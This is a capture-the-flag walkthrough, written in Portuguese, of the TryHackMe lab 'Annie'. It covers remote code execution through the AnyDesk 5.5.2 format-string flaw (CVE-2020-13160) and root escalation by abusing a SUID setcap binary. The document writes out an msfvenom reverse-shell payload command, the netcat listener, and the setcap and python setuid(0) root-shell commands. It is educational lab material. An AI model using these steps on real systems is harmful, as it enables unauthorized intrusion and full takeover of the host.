
# Anotações de Pentest - Lab TryHackMe: Annie

## Resumo da Máquina
* **IP Alvo:** (Variável do laboratório)
* **Vetor de Entrada:** Exploração de Format String no AnyDesk v5.5.2 (CVE-2020-13160).
* **Vetor de Escalação de Privilégio:** Abuso de binário SUID customizado (`setcap`).

---

## Fase 1: Exploração Inicial (Acesso à Máquina)

### 1. Entendendo a vulnerabilidade (CVE-2020-13160)
O AnyDesk versão 5.5.2 para Linux possui uma falha de **Format String**. Ele escuta na porta **50001 (UDP)** para descoberta de rede. Ao enviar um pacote malicioso com caracteres de formatação (ex: `%ln`), o programa interpreta como comandos de escrita na memória, permitindo desviar o fluxo e executar código remoto (RCE).

### 2. Geração do Shellcode Correto
O script público vem com um shellcode padrão para um IP fictício. Para receber a conexão de volta, gerei um novo payload com as minhas configurações de ataque:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.130.24 LPORT=1234 -b "\x00\x25\x26" -f python -v shellcode
```
* **Nota Técnica:** O tamanho do payload gerado deve ser exatamente **119 bytes** para não desalinhá-lo na memória da aplicação alvo, o que causaria um crash sem me dar a shell.
* Os bad chars `-b "\x00\x25\x26"` foram removidos para evitar que o pacote UDP seja cortado antes de injetar o código.

### 3. Edição do Script e Execução
* Abri o arquivo original com o editor `nano`.
* Substituí apenas o bloco da variável `shellcode` pelos novos bytes gerados pelo msfvenom (terminando em `\xfb"`).
* Alterei a variável `ip` no topo para o IP correto do alvo do TryHackMe.
* **Ambiente de Execução:** Como o exploit original foi escrito em formato legado do **Python 2**, sua sintaxe de strings causaria erro de concatenação se executado com Python 3. Portanto, executei usando o interpretador antigo:

```bash
python2 anydesk_exploit.py
```
* **Resultado:** Conexão estabelecida com sucesso no listener do Netcat (`nc -lvnp 1234`), obtendo acesso como o usuário de baixa permissão `annie`.
* **Flag 1 (User):** Encontrada em `/home/annie/user.txt`.

---

## Fase 2: Escalação de Privilégio (Pós-Exploração)

### 1. Enumeração do Sistema
Ao checar privilégios de administrador com `sudo -l`, o sistema exigiu uma senha que eu não possuía. Parti então para a busca por binários com permissões especiais **SUID** (arquivos que rodam temporariamente com poder de root):

```bash
find / -perm -4000 2>/dev/null
```
* **Descoberta:** Na lista gerada, o arquivo `/sbin/setcap` apareceu configurado com o bit SUID ativo. No Linux padrão, usuários comuns não podem usar o `setcap`. Essa configuração foi deixada intencionalmente pelo criador do laboratório, criando uma vulnerabilidade severa listada no projeto **GTFOBins**.

### 2. Entendendo o Conceito de Linux Capabilities
O Linux divide os superpoderes do usuário root em sub-privilégios chamados de **Capabilities**. O comando `setcap` é a ferramenta utilizada para atribuir ou alterar essas permissões em arquivos executáveis.

A capacidade que busco abusar é a **`cap_setuid+ep`**:
* **`cap_setuid`**: Dá ao programa o direito de alterar o ID do usuário (UID) do processo.
* **`+e` (Effective):** Ativa a permissão imediatamente durante a execução.
* **`+p` (Permitted):** Autoriza legalmente o kernel a aceitar essa alteração.

### 3. Execução Técnica da Escalação de Privilégios

Como eu não podia mexer nos binários originais do sistema na pasta `/usr/bin/`, usei a pasta `/tmp` onde qualquer usuário possui direito de gravação total.

1. **Cópia do interpretador:** Clonei o binário limpo do Python 3 para o meu diretório controlado:
   ```bash
   cp /usr/bin/python3 /tmp/python3
   ```
2. **Abuso do `setcap`:** Usei o binário vulnerável do sistema para injetar o superpoder de alteração de ID na minha cópia privada do Python:
   ```bash
   /sbin/setcap cap_setuid+ep /tmp/python3
   ```
3. **Exploitação:** Executei o meu Python modificado. Invoquei a função `os.setuid(0)` (forçando o ID do processo a virar `0`, que pertence ao root) e abri um novo terminal Bash:
   ```bash
   /tmp/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

* **Resultado:** O kernel validou a etiqueta `cap_setuid+ep` no arquivo do `/tmp`, autorizou a requisição e o terminal subiu imediatamente como **`root@desktop`**.
* **Flag 2 (Root):** Encontrada em `/root/root.txt`.